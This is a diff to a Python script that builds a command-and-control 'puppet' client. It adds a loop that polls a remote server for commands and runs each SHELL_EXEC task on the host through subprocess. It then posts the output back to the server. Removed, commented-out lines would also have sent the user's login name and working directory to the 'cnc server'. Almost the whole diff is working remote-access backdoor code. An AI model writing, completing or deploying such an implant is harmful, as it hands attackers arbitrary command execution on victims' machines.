@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 import os
 import sys
-from datetime import datetime
 from subprocess import getoutput as execute
 from uuid import uuid4
 
@@ -47,9 +46,13 @@ class Puppet:
         self.system_encoding = sys.getdefaultencoding()
 
     def get_command(self):
-        pass
+        try:
+            resp = self.session.get(f"{self.server_base_url}/input")
+            return resp.json()
+        except Exception as e:
+            print(e)
 
-    def execute_command(self, task_type, command):
+    def execute_command(self, command):
         os.chdir(self.work_dir)
         try:
             command_as_array = command.split(' ')
@@ -70,38 +73,26 @@ class Puppet:
             "data": result
         }
 
-    def send_results(self, puppet_message: dict):
-        pass
-
-
-def get_command(server_base_url):
-
-
-def communicate(event):
-    session_id = ''
-    now = datetime.now()
-    with Session() as session:
-        def poll_cnc_server(session_id):
-            if session_id:
-                session.headers['Session-ID'] = session_id
-
-            # FIXME get the command, execute it and return the results
-            # resp = session.post(f"{server_base_url}/communicate",
-            #                     json={
-            #                         'creation_timestamp': now.strftime("%m/%d/%Y, %H:%M:%S"),
-            #                         'system_encoding': sys.getdefaultencoding(),
-            #                         'username': os.getlogin(),
-            #                         'pwd': os.getcwd(),
-            #                         '': normalize_event(event)
-            #                     },
-            #                     verify=False)
-
-        while True:
-            try:
-                poll_cnc_server(session_id)
-            except Exception as e:
-                print(e)
+    def send_output(self, puppet_message: dict):
+        try:
+            self.session.post(f"{server_base_url}/output",
+                              json=puppet_message)
+        except Exception as e:
+            print(e)
 
 
 options = get_arguments()
 server_base_url = f"https://{options.server_address}:{options.server_port}"
+
+puppet = Puppet(server_base_url=server_base_url)
+while True:
+    try:
+        task = puppet.get_command()
+
+        # understand what needs to be done
+        if task['task'] == 'SHELL_EXEC':
+            cmd = task['command']
+            output = puppet.execute_command(command=cmd)
+            puppet.send_output(puppet_message=output)
+    except Exception as e:
+        print(e)
